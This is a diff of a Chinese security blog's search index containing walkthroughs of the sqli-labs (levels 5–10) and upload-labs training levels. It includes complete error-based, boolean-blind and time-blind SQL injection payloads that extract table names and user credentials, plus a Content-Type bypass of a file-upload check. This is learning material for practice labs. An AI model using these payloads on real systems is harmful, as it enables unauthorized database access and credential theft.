-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1&quot;and updatexml(1,concat(0x7e,(select concat(database(),0x7e,version())),0x23),1)--+</span><br></pre></td></tr></table></figure>
-</li>
-<li><p><strong>爆表</strong></p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=-1&quot;and updatexml(1,concat(0x23,(select group_concat(table_name) from information_schema.tables where table_schema=&#x27;security&#x27;),0x23),1)--+</span><br></pre></td></tr></table></figure>
-</li>
-<li><p><strong>爆字段名</strong></p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=-1&quot;and updatexml(1,concat(0x23,(select group_concat(column_name) from information_schema.columns where table_schema=&#x27;security&#x27; and table_name=&#x27;users&#x27;),0x23),1)--+</span><br></pre></td></tr></table></figure>
-<p>因为updatexml()函数最多只能显示32个字符，无法显示到所需的数据，所以不能只写where table_name&#x3D;’users’  应该再加一个限定到当前数据库。</p>
-</li>
-<li><p><strong>爆数据</strong></p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1&quot;and updatexml(1,concat(0x7e,(select concat(username,0x7e,password) from users limit 0,1),0x23),1)--+</span><br></pre></td></tr></table></figure>
-<p>因为updatexml()函数最多只能显示32个字符，所需数据可能无法显示完全，因此需要使用limit限制每行显示一组数据。<br><strong>limit</strong>简单解释：<br>limit 3,1  表示返回从第3行起的1行数据，逗号之前的值对应OFFSET，逗号之后的值对应LIMIT。<br>注意：limit第一个被检索的行是第0行，当检索完后不会显示数据</p>
-</li>
-</ol>
-<h1 id="致谢"><a href="#致谢" class="headerlink" title="致谢"></a>致谢</h1><ul>
-<li><p><a href="https://blog.csdn.net/wyzhxhn/article/details/127718995">sqli-labs—–第五关</a></p>
-</li>
-<li><p><a href="https://blog.csdn.net/Yb_140/article/details/123223306">sql-labs(1-65)</a></p>
-</li>
-</ul>
-]]></content>
-      <categories>
-        <category>SQL注入</category>
-        <category>sqli-labs</category>
-      </categories>
-      <tags>
-        <tag>SQL注入</tag>
-        <tag>sqli-labs</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>sqli-labs_54-57</title>
     <url>/2022/11/19/sqli-labs_54-57/</url>
     <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>知识基本都已经学完了，从这里开始就是训练了。</p>
@@ -5279,39 +5330,81 @@ secure_file_priv 一栏的value为空，即是成功</li>
       </tags>
   </entry>
   <entry>
-    <title>sqli-labs_8</title>
-    <url>/2022/11/09/sqli-labs_8/</url>
-    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>本次第八关页面只能显示对错，而没有任何其它信息，因此我们可以使用布尔盲注和时间盲注。这里主要来讲讲用<a href="https://truthnian.github.io/2022/11/08/%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8/">布尔盲注</a>如何完成的。</p>
+    <title>sqli-labs_5+6</title>
+    <url>/2022/11/08/sqli-labs_5+6/</url>
+    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>第5，6关基本一致，区别只在于单引号和双引号，因此放在一起了。这两关的关键点在于：正确时不返回结果，错误时有报错信息。因此综合判断之下，使用报错注入的方式最好。</p>
 <span id="more"></span>
 
 <h1 id="解决步骤"><a href="#解决步骤" class="headerlink" title="解决步骤"></a>解决步骤</h1><ol>
-<li><p>判断是否存在<strong>SQL注入</strong>并判断注入类型<br>输入?id&#x3D;1  显示：You are in………..<br>输入?id&#x3D;1’ 无任何显示，说明是错误的<br>输入?id&#x3D;1’’  显示：You are in………..<br>输入?id&#x3D;1’--+  显示：You are in………..<br>说明构造成功，且是单引号字符型</p>
+<li><p>判断是否存在<strong>SQL注入</strong><br>和前几关一致，这里不过多阐述。<br>输入?id&#x3D;1”有报错信息。<br>报错信息为：<br><img src="/simg/sqli-labs_6.png" alt="sqli-labs_6输入?id=1&quot;时的报错信息"></p>
 </li>
-<li><p>获取当前<strong>数据库名和数据库版本号</strong></p>
+<li><p>判断SQL注入类型是<strong>字符型</strong>还是<strong>数字型</strong><br>由报错信息near ‘“1”” LIMIT 0,1’ at line 1可知是双引号字符型。<br>构造语句?id&#x3D;1”–+</p>
 </li>
-</ol>
-<ul>
-<li>由于无法显示报错信息，我们需要使用length()函数首先判断数据库名长度<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1&#x27;and length(database())&gt;7--+  返回正确</span><br><span class="line">?id=1&#x27;and length(database())&gt;8--+  返回错误</span><br></pre></td></tr></table></figure>
-说明数据库名长度为8</li>
-<li>接下来便是一个个判断字符，这里可以使用substr(),mid(),substring(),ord(),ascii()等，选择比较多，任意选取即可<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1&#x27;and ord(substr(database(),1,1))&gt;114--+   返回正确</span><br><span class="line">?id=1&#x27;and ord(substr(database(),1,1))&gt;115--+   返回错误</span><br></pre></td></tr></table></figure>
-说明数据库名第1个字符是s，以此类推，可得数据库名为security<br>数据库版本号也是同理</li>
-</ul>
-<ol start="3">
-<li><p><strong>爆表</strong><br>道理是类似的</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1&#x27;and ord(substr((select table_name from information_schema.tables where table_schema=&#x27;security&#x27; limit 0,1),1,1))&lt;102--+   返回正确</span><br><span class="line">?id=1&#x27;and ord(substr((select table_name from information_schema.tables where table_schema=&#x27;security&#x27; limit 0,1),1,1))&lt;101--+   返回错误</span><br></pre></td></tr></table></figure>
-<p>说明第一个表名的第1个字符是e，以此类推，可以得到所有表名，最终我们发现关键的表名users<br>这里使用limit的原因是因为一个数据库名中表名很可能不止一个，我们需要依次查询</p>
+<li><p>猜解SQL查询语句中的<strong>字段数</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1&quot;order by 4--+</span><br></pre></td></tr></table></figure>
+<p>可得字段数为3</p>
+</li>
+<li><p>获取当前<strong>数据库名和数据库版本号</strong><br>由于无法返回正常信息，所以不能使用union联合查询<br>使用报错注入常用的函数即可（<a href="https://truthnian.github.io/2022/11/08/%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5%E5%B8%B8%E7%94%A8%E5%87%BD%E6%95%B0/">常用函数</a>）</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1&quot;and updatexml(1,concat(0x7e,(select concat(database(),0x7e,version())),0x23),1)--+</span><br></pre></td></tr></table></figure>
+</li>
+<li><p><strong>爆表</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=-1&quot;and updatexml(1,concat(0x23,(select group_concat(table_name) from information_schema.tables where table_schema=&#x27;security&#x27;),0x23),1)--+</span><br></pre></td></tr></table></figure>
 </li>
 <li><p><strong>爆字段名</strong></p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1&#x27;and ord(substr((select column_name from information_schema.columns where table_schema=&#x27;security&#x27; and table_name=&#x27;users&#x27; limit 0,1),1,1))&lt;106--+   返回正确</span><br><span class="line">?id=1&#x27;and ord(substr((select column_name from information_schema.columns where table_schema=&#x27;security&#x27; and table_name=&#x27;users&#x27; limit 0,1),1,1))&lt;105--+   返回错误</span><br></pre></td></tr></table></figure>
-<p>说明第一个字段名是i，以此类推，可以得到所有字段名，最终我们发现关键的字段名username,password</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=-1&quot;and updatexml(1,concat(0x23,(select group_concat(column_name) from information_schema.columns where table_schema=&#x27;security&#x27; and table_name=&#x27;users&#x27;),0x23),1)--+</span><br></pre></td></tr></table></figure>
+<p>因为updatexml()函数最多只能显示32个字符，无法显示到所需的数据，所以不能只写where table_name&#x3D;’users’  应该再加一个限定到当前数据库。</p>
 </li>
 <li><p><strong>爆数据</strong></p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1&#x27;and ord(substr((select username from users limit 0,1),1,1))&gt;67--+  返回正确</span><br><span class="line">?id=1&#x27;and ord(substr((select username from users limit 0,1),1,1))&gt;68--+  返回错误</span><br></pre></td></tr></table></figure>
-<p>说明第一个用户名是D，以此类推，可以得到所有用户名和密码。</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1&quot;and updatexml(1,concat(0x7e,(select concat(username,0x7e,password) from users limit 0,1),0x23),1)--+</span><br></pre></td></tr></table></figure>
+<p>因为updatexml()函数最多只能显示32个字符，所需数据可能无法显示完全，因此需要使用limit限制每行显示一组数据。<br><strong>limit</strong>简单解释：<br>limit 3,1  表示返回从第3行起的1行数据，逗号之前的值对应OFFSET，逗号之后的值对应LIMIT。<br>注意：limit第一个被检索的行是第0行，当检索完后不会显示数据</p>
 </li>
 </ol>
-<h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><p>手动进行布尔注入或时间注入很麻烦，我们只需要理解并记住其原理步骤即可</p>
-<h1 id="致谢"><a href="#致谢" class="headerlink" title="致谢"></a>致谢</h1><p><a href="https://blog.csdn.net/FourthGuy/article/details/108984045">sqli-labs-master第八关</a></p>
+<h1 id="致谢"><a href="#致谢" class="headerlink" title="致谢"></a>致谢</h1><ul>
+<li><p><a href="https://blog.csdn.net/wyzhxhn/article/details/127718995">sqli-labs—–第五关</a></p>
+</li>
+<li><p><a href="https://blog.csdn.net/Yb_140/article/details/123223306">sql-labs(1-65)</a></p>
+</li>
+</ul>
+]]></content>
+      <categories>
+        <category>SQL注入</category>
+        <category>sqli-labs</category>
+      </categories>
+      <tags>
+        <tag>SQL注入</tag>
+        <tag>sqli-labs</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>sqli-labs_9+10</title>
+    <url>/2022/11/09/sqli-labs_9+10/</url>
+    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>本次第九关既不能显示正确，也不会显示错误。因此不能使用布尔盲注，只能使用<a href="https://truthnian.github.io/2022/11/09/%E6%97%B6%E9%97%B4%E7%9B%B2%E6%B3%A8/">时间盲注</a>。</p>
+<span id="more"></span>
+
+<h1 id="解决步骤"><a href="#解决步骤" class="headerlink" title="解决步骤"></a>解决步骤</h1><ol>
+<li><p>判断是否存在<strong>SQL注入</strong>并判断注入类型<br>输入?id&#x3D;1  显示：You are in………..<br>输入?id&#x3D;1’ 显示：You are in………..<br>输入?id&#x3D;1” 显示：You are in………..<br>此时我们应该发现端倪，页面可能不会返回任何信息<br>输入?id&#x3D;1 and sleep(5)--+  页面迅速显示<br>输入?id&#x3D;1’and sleep(5)--+  页面延迟了5s，说明的确是应当使用时间盲注<br>输入?id&#x3D;1’’and sleep(5)--+  页面迅速显示<br>说明是单引号字符型注入</p>
+</li>
+<li><p>获取当前<strong>数据库名和数据库版本号</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1&#x27;and if(length((select database()))&gt;7,sleep(5),1)--+    页面迅速显示</span><br><span class="line">?id=1&#x27;and if(length((select database()))&gt;8,sleep(5),1)--+    页面延迟了5s</span><br></pre></td></tr></table></figure>
+<p>说明数据库名长度是8个字符<br>版本号以此类推</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1&#x27;and if(ascii(substr((select database()),1,1))&gt;115,sleep(5),1)--+   页面迅速显示</span><br><span class="line">?id=1&#x27;and if(ascii(substr((select database()),1,1))&gt;114,sleep(5),1)--+   页面延迟了5s</span><br></pre></td></tr></table></figure>
+<p>最终尝试完后可得数据库名是security</p>
+</li>
+<li><p><strong>爆表</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1&#x27;and if(length((select group_concat(table_name) from information_schema.tables where table_schema=database()))&gt;13,sleep(5),1)--+</span><br><span class="line">如此判断所有表名长度</span><br><span class="line">?id=1&#x27;and if(ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),1,1))&gt;99,sleep(5),1)--+</span><br><span class="line">再逐一判断表名</span><br></pre></td></tr></table></figure>
+<p>最终尝试完后可得所需表名为users</p>
+</li>
+<li><p><strong>爆字段名</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1&#x27;and if(length((select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=&#x27;users&#x27;))&gt;20,sleep(5),1)--+</span><br><span class="line">判断所有字段名的长度</span><br><span class="line">?id=1&#x27;and if(ascii(substr((select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=&#x27;users&#x27;),1,1))&gt;99,sleep(5),1)--+</span><br><span class="line">逐一判断字段名</span><br></pre></td></tr></table></figure>
+<p>最终出现了我们所需的字段名username, password</p>
+</li>
+<li><p><strong>爆数据</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1&#x27; and if(length((select group_concat(username,password) from users))&gt;109,sleep(5),1)--+</span><br><span class="line">判断字段内容长度</span><br><span class="line">?id=1&#x27; and if(ascii(substr((select group_concat(username,password) from users),1,1))&gt;50,sleep(5),1)--+</span><br><span class="line">逐一检测内容</span><br></pre></td></tr></table></figure>
+<p>最终得到了所需的数据</p>
+</li>
+</ol>
+<h2 id="第9关和第10关思路相同，不同点是第9关的单引号在第10关换成了双引号"><a href="#第9关和第10关思路相同，不同点是第9关的单引号在第10关换成了双引号" class="headerlink" title="第9关和第10关思路相同，不同点是第9关的单引号在第10关换成了双引号"></a>第9关和第10关思路相同，不同点是第9关的单引号在第10关换成了双引号</h2><h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><p>我终于知道为什么别人写博客，有些关会写得相当简略了，因为都是一样的，确实没意思…</p>
+<h1 id="致谢"><a href="#致谢" class="headerlink" title="致谢"></a>致谢</h1><p><a href="https://blog.csdn.net/dreamthe/article/details/123795302">详细sqli-labs（1-65）通关讲解</a></p>
 ]]></content>
       <categories>
         <category>SQL注入</category>
@@ -5374,35 +5467,39 @@ secure_file_priv 一栏的value为空，即是成功</li>
       </tags>
   </entry>
   <entry>
-    <title>sqli-labs_9+10</title>
-    <url>/2022/11/09/sqli-labs_9+10/</url>
-    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>本次第九关既不能显示正确，也不会显示错误。因此不能使用布尔盲注，只能使用<a href="https://truthnian.github.io/2022/11/09/%E6%97%B6%E9%97%B4%E7%9B%B2%E6%B3%A8/">时间盲注</a>。</p>
+    <title>sqli-labs_8</title>
+    <url>/2022/11/09/sqli-labs_8/</url>
+    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>本次第八关页面只能显示对错，而没有任何其它信息，因此我们可以使用布尔盲注和时间盲注。这里主要来讲讲用<a href="https://truthnian.github.io/2022/11/08/%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8/">布尔盲注</a>如何完成的。</p>
 <span id="more"></span>
 
 <h1 id="解决步骤"><a href="#解决步骤" class="headerlink" title="解决步骤"></a>解决步骤</h1><ol>
-<li><p>判断是否存在<strong>SQL注入</strong>并判断注入类型<br>输入?id&#x3D;1  显示：You are in………..<br>输入?id&#x3D;1’ 显示：You are in………..<br>输入?id&#x3D;1” 显示：You are in………..<br>此时我们应该发现端倪，页面可能不会返回任何信息<br>输入?id&#x3D;1 and sleep(5)--+  页面迅速显示<br>输入?id&#x3D;1’and sleep(5)--+  页面延迟了5s，说明的确是应当使用时间盲注<br>输入?id&#x3D;1’’and sleep(5)--+  页面迅速显示<br>说明是单引号字符型注入</p>
+<li><p>判断是否存在<strong>SQL注入</strong>并判断注入类型<br>输入?id&#x3D;1  显示：You are in………..<br>输入?id&#x3D;1’ 无任何显示，说明是错误的<br>输入?id&#x3D;1’’  显示：You are in………..<br>输入?id&#x3D;1’--+  显示：You are in………..<br>说明构造成功，且是单引号字符型</p>
 </li>
 <li><p>获取当前<strong>数据库名和数据库版本号</strong></p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1&#x27;and if(length((select database()))&gt;7,sleep(5),1)--+    页面迅速显示</span><br><span class="line">?id=1&#x27;and if(length((select database()))&gt;8,sleep(5),1)--+    页面延迟了5s</span><br></pre></td></tr></table></figure>
-<p>说明数据库名长度是8个字符<br>版本号以此类推</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1&#x27;and if(ascii(substr((select database()),1,1))&gt;115,sleep(5),1)--+   页面迅速显示</span><br><span class="line">?id=1&#x27;and if(ascii(substr((select database()),1,1))&gt;114,sleep(5),1)--+   页面延迟了5s</span><br></pre></td></tr></table></figure>
-<p>最终尝试完后可得数据库名是security</p>
-</li>
-<li><p><strong>爆表</strong></p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1&#x27;and if(length((select group_concat(table_name) from information_schema.tables where table_schema=database()))&gt;13,sleep(5),1)--+</span><br><span class="line">如此判断所有表名长度</span><br><span class="line">?id=1&#x27;and if(ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),1,1))&gt;99,sleep(5),1)--+</span><br><span class="line">再逐一判断表名</span><br></pre></td></tr></table></figure>
-<p>最终尝试完后可得所需表名为users</p>
-</li>
-<li><p><strong>爆字段名</strong></p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1&#x27;and if(length((select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=&#x27;users&#x27;))&gt;20,sleep(5),1)--+</span><br><span class="line">判断所有字段名的长度</span><br><span class="line">?id=1&#x27;and if(ascii(substr((select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=&#x27;users&#x27;),1,1))&gt;99,sleep(5),1)--+</span><br><span class="line">逐一判断字段名</span><br></pre></td></tr></table></figure>
-<p>最终出现了我们所需的字段名username, password</p>
-</li>
-<li><p><strong>爆数据</strong></p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1&#x27; and if(length((select group_concat(username,password) from users))&gt;109,sleep(5),1)--+</span><br><span class="line">判断字段内容长度</span><br><span class="line">?id=1&#x27; and if(ascii(substr((select group_concat(username,password) from users),1,1))&gt;50,sleep(5),1)--+</span><br><span class="line">逐一检测内容</span><br></pre></td></tr></table></figure>
-<p>最终得到了所需的数据</p>
 </li>
 </ol>
-<h2 id="第9关和第10关思路相同，不同点是第9关的单引号在第10关换成了双引号"><a href="#第9关和第10关思路相同，不同点是第9关的单引号在第10关换成了双引号" class="headerlink" title="第9关和第10关思路相同，不同点是第9关的单引号在第10关换成了双引号"></a>第9关和第10关思路相同，不同点是第9关的单引号在第10关换成了双引号</h2><h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><p>我终于知道为什么别人写博客，有些关会写得相当简略了，因为都是一样的，确实没意思…</p>
-<h1 id="致谢"><a href="#致谢" class="headerlink" title="致谢"></a>致谢</h1><p><a href="https://blog.csdn.net/dreamthe/article/details/123795302">详细sqli-labs（1-65）通关讲解</a></p>
+<ul>
+<li>由于无法显示报错信息，我们需要使用length()函数首先判断数据库名长度<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1&#x27;and length(database())&gt;7--+  返回正确</span><br><span class="line">?id=1&#x27;and length(database())&gt;8--+  返回错误</span><br></pre></td></tr></table></figure>
+说明数据库名长度为8</li>
+<li>接下来便是一个个判断字符，这里可以使用substr(),mid(),substring(),ord(),ascii()等，选择比较多，任意选取即可<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1&#x27;and ord(substr(database(),1,1))&gt;114--+   返回正确</span><br><span class="line">?id=1&#x27;and ord(substr(database(),1,1))&gt;115--+   返回错误</span><br></pre></td></tr></table></figure>
+说明数据库名第1个字符是s，以此类推，可得数据库名为security<br>数据库版本号也是同理</li>
+</ul>
+<ol start="3">
+<li><p><strong>爆表</strong><br>道理是类似的</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1&#x27;and ord(substr((select table_name from information_schema.tables where table_schema=&#x27;security&#x27; limit 0,1),1,1))&lt;102--+   返回正确</span><br><span class="line">?id=1&#x27;and ord(substr((select table_name from information_schema.tables where table_schema=&#x27;security&#x27; limit 0,1),1,1))&lt;101--+   返回错误</span><br></pre></td></tr></table></figure>
+<p>说明第一个表名的第1个字符是e，以此类推，可以得到所有表名，最终我们发现关键的表名users<br>这里使用limit的原因是因为一个数据库名中表名很可能不止一个，我们需要依次查询</p>
+</li>
+<li><p><strong>爆字段名</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1&#x27;and ord(substr((select column_name from information_schema.columns where table_schema=&#x27;security&#x27; and table_name=&#x27;users&#x27; limit 0,1),1,1))&lt;106--+   返回正确</span><br><span class="line">?id=1&#x27;and ord(substr((select column_name from information_schema.columns where table_schema=&#x27;security&#x27; and table_name=&#x27;users&#x27; limit 0,1),1,1))&lt;105--+   返回错误</span><br></pre></td></tr></table></figure>
+<p>说明第一个字段名是i，以此类推，可以得到所有字段名，最终我们发现关键的字段名username,password</p>
+</li>
+<li><p><strong>爆数据</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1&#x27;and ord(substr((select username from users limit 0,1),1,1))&gt;67--+  返回正确</span><br><span class="line">?id=1&#x27;and ord(substr((select username from users limit 0,1),1,1))&gt;68--+  返回错误</span><br></pre></td></tr></table></figure>
+<p>说明第一个用户名是D，以此类推，可以得到所有用户名和密码。</p>
+</li>
+</ol>
+<h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><p>手动进行布尔注入或时间注入很麻烦，我们只需要理解并记住其原理步骤即可</p>
+<h1 id="致谢"><a href="#致谢" class="headerlink" title="致谢"></a>致谢</h1><p><a href="https://blog.csdn.net/FourthGuy/article/details/108984045">sqli-labs-master第八关</a></p>
 ]]></content>
       <categories>
         <category>SQL注入</category>
@@ -5509,6 +5606,29 @@ secure_file_priv 一栏的value为空，即是成功</li>
       </tags>
   </entry>
   <entry>
+    <title>upload-labs_2</title>
+    <url>/2022/11/24/upload-labs_2/</url>
+    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>这一关难度也不大，只是涉及到了新的知识点。</p>
+<span id="more"></span>
+<h1 id="解决步骤"><a href="#解决步骤" class="headerlink" title="解决步骤"></a>解决步骤</h1><ol>
+<li><p>测试<br>首先可以尝试传输文件。<br>当我传输一个txt文件时，提示类型错误，但这次和第一关不同，不是弹窗，而是页面直接提示，因此不是前端JavaScript验证。<br>这时我们查看源码，可以看到下面这一段：</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> ((<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;type&#x27;</span>] == <span class="string">&#x27;image/jpeg&#x27;</span>) || (<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;type&#x27;</span>] == <span class="string">&#x27;image/png&#x27;</span>) || (<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;type&#x27;</span>] == <span class="string">&#x27;image/gif&#x27;</span>)) &#123;</span><br><span class="line">            <span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">            <span class="variable">$img_path</span> = UPLOAD_PATH . <span class="string">&#x27;/&#x27;</span> . <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]            </span><br><span class="line">            <span class="keyword">if</span> (<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$temp_file</span>, <span class="variable">$img_path</span>)) &#123;</span><br><span class="line">                <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="variable">$msg</span> = <span class="string">&#x27;上传出错！&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&#x27;文件类型不正确，请重新上传！&#x27;</span>;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure>
+<p>从这段代码可以看出，上传文件的途中验证了content-type，并且固定了上传文件类型。这里涉及到了MIME。<br>MIME (Multipurpose Internet Mail Extensions) 是描述消息内容类型的标准，用来表示文档、文件或字节流的性质和格式。<br>MIME 消息能包含文本、图像、音频、视频以及其他应用程序专用的数据。<br>浏览器通常使用 MIME 类型（而不是文件扩展名）来确定如何处理URL，因此 We b服务器在响应头中添加正确的 MIME 类型非常重要。如果配置不正确，浏览器可能会无法解析文件内容，网站将无法正常工作，并且下载的文件也会被错误处理。<br>语法：<br>type&#x2F;subtype<br>用法：<br>客户端：<br>告诉服务端上传文件类型<br>告诉服务端可以接受文件类型<br>服务端：<br>告诉客户端响应数据类型<br>详细参见：<a href="https://www.runoob.com/http/mime-types.html">MIME 类型</a><br>因此可以通过改变content-type来让目标文件上传成功</p>
+</li>
+<li><p>尝试与抓包<br>burp抓包，将content-type更改为image&#x2F;png，然后放包，我们就看到文件上传成功了。<br>然后打开，显示没问题，最终成功！</p>
+</li>
+</ol>
+<h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><p>总的来说，没什么难度。</p>
+<h1 id="致谢"><a href="#致谢" class="headerlink" title="致谢"></a>致谢</h1><p><a href="https://blog.csdn.net/m0_62879498/article/details/123021865">文件上传漏洞——upload-labs 1-19</a><br><a href="https://blog.csdn.net/K_ShenH/article/details/122438998">upload-labs安装及攻略</a></p>
+]]></content>
+      <categories>
+        <category>upload-labs</category>
+      </categories>
+      <tags>
+        <tag>upload-labs</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>upload-labs_18+19</title>
     <url>/2022/11/27/upload-labs_18+19/</url>
     <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>这一关burp发挥的作用很大</p>
@@ -5530,29 +5650,6 @@ secure_file_priv 一栏的value为空，即是成功</li>
       <tags>
         <tag>upload-labs</tag>
         <tag>burp</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>upload-labs_2</title>
-    <url>/2022/11/24/upload-labs_2/</url>
-    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>这一关难度也不大，只是涉及到了新的知识点。</p>
-<span id="more"></span>
-<h1 id="解决步骤"><a href="#解决步骤" class="headerlink" title="解决步骤"></a>解决步骤</h1><ol>
-<li><p>测试<br>首先可以尝试传输文件。<br>当我传输一个txt文件时，提示类型错误，但这次和第一关不同，不是弹窗，而是页面直接提示，因此不是前端JavaScript验证。<br>这时我们查看源码，可以看到下面这一段：</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> ((<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;type&#x27;</span>] == <span class="string">&#x27;image/jpeg&#x27;</span>) || (<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;type&#x27;</span>] == <span class="string">&#x27;image/png&#x27;</span>) || (<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;type&#x27;</span>] == <span class="string">&#x27;image/gif&#x27;</span>)) &#123;</span><br><span class="line">            <span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">            <span class="variable">$img_path</span> = UPLOAD_PATH . <span class="string">&#x27;/&#x27;</span> . <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]            </span><br><span class="line">            <span class="keyword">if</span> (<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$temp_file</span>, <span class="variable">$img_path</span>)) &#123;</span><br><span class="line">                <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="variable">$msg</span> = <span class="string">&#x27;上传出错！&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&#x27;文件类型不正确，请重新上传！&#x27;</span>;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure>
-<p>从这段代码可以看出，上传文件的途中验证了content-type，并且固定了上传文件类型。这里涉及到了MIME。<br>MIME (Multipurpose Internet Mail Extensions) 是描述消息内容类型的标准，用来表示文档、文件或字节流的性质和格式。<br>MIME 消息能包含文本、图像、音频、视频以及其他应用程序专用的数据。<br>浏览器通常使用 MIME 类型（而不是文件扩展名）来确定如何处理URL，因此 We b服务器在响应头中添加正确的 MIME 类型非常重要。如果配置不正确，浏览器可能会无法解析文件内容，网站将无法正常工作，并且下载的文件也会被错误处理。<br>语法：<br>type&#x2F;subtype<br>用法：<br>客户端：<br>告诉服务端上传文件类型<br>告诉服务端可以接受文件类型<br>服务端：<br>告诉客户端响应数据类型<br>详细参见：<a href="https://www.runoob.com/http/mime-types.html">MIME 类型</a><br>因此可以通过改变content-type来让目标文件上传成功</p>
-</li>
-<li><p>尝试与抓包<br>burp抓包，将content-type更改为image&#x2F;png，然后放包，我们就看到文件上传成功了。<br>然后打开，显示没问题，最终成功！</p>
-</li>
-</ol>
